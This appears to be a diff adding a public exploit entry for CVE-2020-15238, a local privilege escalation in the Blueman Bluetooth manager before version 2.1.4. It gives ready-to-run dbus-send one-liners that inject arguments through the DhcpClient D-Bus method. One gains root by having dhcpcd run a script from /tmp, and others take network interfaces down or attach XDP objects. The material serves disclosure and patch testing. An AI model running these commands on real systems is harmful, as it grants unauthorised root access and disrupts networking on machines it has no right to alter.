@@ -1,0 +1,54 @@
+# Exploit Title: Local Privilege Escalation in Blueman < 2.1.4
+# Date: 2020-10-27
+# Exploit Author: Vaisha Bernard (vbernard - at - eyecontrol.nl)
+# Vendor Homepage: https://github.com/blueman-project/blueman
+# Software Link: https://github.com/blueman-project/blueman
+# Version: < 2.1.4
+# Tested on: Ubuntu 20.04
+# CVE: CVE-2020-15238
+#
+# By default installed on Ubuntu 16.04 - 20.10 and
+# Debian 9 - 11
+#
+# Local root exploit when dhcpcd is used instead of dhclient
+# 
+# Reference: https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html
+#
+# 
+# The DhcpClient method of the d-bus interface to blueman-mechanism 
+# is prone to an argument injection vulnerability. 
+# On systems where the isc-dhcp-client package is removed 
+# and the dhcpcd package installed, this leads to Local 
+# Privilege Escalation to root from any unprivileged user. 
+# See attached python script for a working exploit. Or use 
+# this oneliner with a shellscript "/tmp/eye":
+ 
+dbus-send --print-reply --system --dest=org.blueman.Mechanism \
+/org/blueman/mechanism org.blueman.Mechanism.DhcpClient \
+string:"-c/tmp/eye"
+
+# This happens because the argument is not sanitized before 
+# being used as an argument to dhcpcd.
+# 
+# Also on default installations with isc-dhcp-client installed, 
+# this can lead to DoS attacks by bringing any interface down 
+# as follows:
+
+dbus-send --print-reply --system --dest=org.blueman.Mechanism \
+/org/blueman/mechanism org.blueman.Mechanism.DhcpClient \
+string:"ens33 down al"
+
+# Or allows users to attach XDP objects to an interface:
+
+dbus-send --print-reply --system --dest=org.blueman.Mechanism \
+/org/blueman/mechanism org.blueman.Mechanism.DhcpClient \
+string:"ens33 down al"
+dbus-send --print-reply --system --dest=org.blueman.Mechanism \
+/org/blueman/mechanism org.blueman.Mechanism.DhcpClient \
+string:"ens33 name a"
+dbus-send --print-reply --system --dest=org.blueman.Mechanism \
+/org/blueman/mechanism org.blueman.Mechanism.DhcpClient \
+string:"a xdp o /tmp/o"
+
+# This both happens because the argument is passed to "ip link" 
+# unsanitized.
